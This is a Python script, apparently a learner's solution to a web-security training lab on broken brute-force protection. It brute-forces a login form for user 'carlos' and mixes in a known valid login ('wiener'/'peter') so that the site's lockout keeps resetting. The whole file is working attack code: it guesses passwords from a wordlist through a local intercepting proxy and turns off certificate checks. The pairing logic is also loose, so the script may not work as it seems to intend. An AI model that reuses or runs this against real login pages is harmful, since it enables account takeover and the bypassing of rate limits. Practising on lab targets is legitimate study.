import requests
import sys
import urllib3
from pathlib import Path

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
headers = {'User-Agent':'Mozilla/5.0'}
i_password = Path("./password.txt")

def Tes_password(i_password):
    with open(i_password,"r") as file:        # file represents the open file objects 
        lines = file.readlines()              # this line will store each line as a list, i.e passw is a list
    cleaned = [i.strip() for i in lines]
    i = 1
    password = []
    for pwd in cleaned:
        password.append(pwd)
        if i % 2 == 0:
            password.append("peter")
        i += 1
    return password

def i_username():
    username=[]
    for i in range(150):
        if i%3 == 0:
            username.append("wiener") 
        else:
            username.append("carlos")
    return username

def brokenPass(url,pas,use):
    for i in use:
        for j in pas:
            payload = {"Username" : i, "Password": j }
            try:
                r = requests.post(url,data = payload,verify = False, proxies= proxy,headers=headers,allow_redirects=False)
            except requests.RequestException as e:
                print(e)
                continue
            if i == "carlos" and r.status_code == 302:
                return j

def main():
    if len(sys.argv) != 2:
        print("format = script.py <URL path> <payload>")
        sys.exit(1)
    baseUrl= sys.argv[1].strip()
    password = Tes_password(i_password)
    username = i_username()
    carlPass = brokenPass(baseUrl,password,username)
    if carlPass:
        print(f"Found password:{carlPass}")
    else:
        print("No password found for carlose")

        
if __name__ == '__main__' :
    main()   